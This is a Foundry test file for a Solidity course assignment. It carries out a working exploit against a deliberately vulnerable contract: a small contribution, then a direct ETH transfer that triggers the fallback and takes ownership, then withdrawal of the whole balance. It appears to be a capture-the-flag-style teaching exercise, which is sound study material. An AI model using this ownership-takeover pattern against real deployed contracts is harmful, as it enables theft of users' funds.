// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Assignment11.sol";

contract Assignment11ExploitTest is Test {
    Assignment11 public target;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        target = new Assignment11();
        vm.deal(address(target), 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Step 1: Contribute a small amount (< 0.001 ether)
        target.contribute{value: 0.0005 ether}();
        assertGt(target.getContribution(), 0, "Contribution failed");

        // Step 2: Trigger the fallback function by sending ETH directly
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "Fallback failed");

        // Verify that attacker is now owner
        assertEq(target.owner(), attacker, "Ownership not transferred");

        // Step 3: Withdraw all funds
        uint256 balanceBefore = attacker.balance;
        target.withdraw();
        uint256 balanceAfter = attacker.balance;

        assertGt(balanceAfter, balanceBefore, "Withdraw failed");

        vm.stopPrank();
    }

    receive() external payable {}
}
